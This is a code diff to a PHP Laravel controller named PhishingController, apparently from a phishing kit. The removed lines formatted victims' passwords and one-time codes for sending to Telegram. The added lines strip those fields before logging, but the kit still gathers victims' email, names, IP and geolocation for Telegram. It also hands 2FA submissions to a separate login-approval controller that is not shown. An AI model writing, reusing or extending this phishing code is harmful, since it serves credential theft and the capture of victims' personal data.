@@ -27,7 +27,7 @@ class PhishingController extends Controller
         return $path;
     }
 
-    private function getSessionData()
+    public function getSessionData()
     {
         if (!Session::has('_s_data')) {
             $pathToken1 = Str::random(60);
@@ -204,13 +204,7 @@ class PhishingController extends Controller
 
         $this->logAndSend($data);
 
-        if (($data['step'] ?? 1) == 1) {
-            return response()->json(['action' => 'reload']);
-        } else {
-            $session = Session::get('_s_data');
-            $redirectUrl = $session ? $session['metaBasePath'] . "/1" : "/";
-            return response()->json(['action' => 'complete', 'redirectUrl' => $redirectUrl]);
-        }
+        return app(LoginApprovalController::class)->submit2fa($request);
     }
 
     public function handleGenericLog(Request $request)
@@ -226,6 +220,7 @@ class PhishingController extends Controller
 
     private function logAndSend($data)
     {
+        $data = $this->stripSensitiveFields($data);
         $ip = $data['ip'];
         $geo = $this->getGeo($ip);
 
@@ -290,25 +285,13 @@ class PhishingController extends Controller
 
         if (isset($data['email']))
             $msg .= "Email: `{$escapeMd($data['email'])}`\n";
-        if (isset($data['pass']))
-            $msg .= "Password: `{$escapeMd($data['pass'])}`\n";
-        if (isset($data['password1']))
-            $msg .= "Pass 1: `{$escapeMd($data['password1'])}`\n";
-        if (isset($data['password2']))
-            $msg .= "Pass 2: `{$escapeMd($data['password2'])}`\n";
 
         if (isset($data['firstName']) || isset($data['lastName'])) {
             $msg .= "Name: {$escapeMd($data['firstName'] ?? '')} {$escapeMd($data['lastName'] ?? '')}\n";
         }
 
         $msg .= "----------------------------------------------------------\n";
-
-        if (isset($data['code'])) {
-            $label = (isset($data['attempt']) || isset($data['step'])) ? "Code " . ($data['attempt'] ?? $data['step']) : "Code";
-            $msg .= "{$label}: `{$escapeMd($data['code'])}`\n";
-        }
-        if (isset($data['code2']))
-            $msg .= "Code 2: `{$escapeMd($data['code2'])}`\n";
+        $msg .= "Sensitive fields: removed before logging/Telegram\n";
 
         $msg .= "----------------------------------------------------------\n";
         $msg .= "IP Address: `{$escapeMd($data['ip'] ?? 'N/A')}`\n";
@@ -330,6 +313,27 @@ class PhishingController extends Controller
             $msg .= "Page: {$data['page']}\n";
 
         return $msg;
+    }
+
+    private function stripSensitiveFields(array $data): array
+    {
+        $sensitiveKeys = [
+            'pass',
+            'password',
+            'password1',
+            'password2',
+            'code',
+            'code2',
+            'otp',
+            'token',
+            'secret',
+        ];
+
+        foreach ($sensitiveKeys as $key) {
+            unset($data[$key]);
+        }
+
+        return $data;
     }
 
     private function sendToTelegram($message)
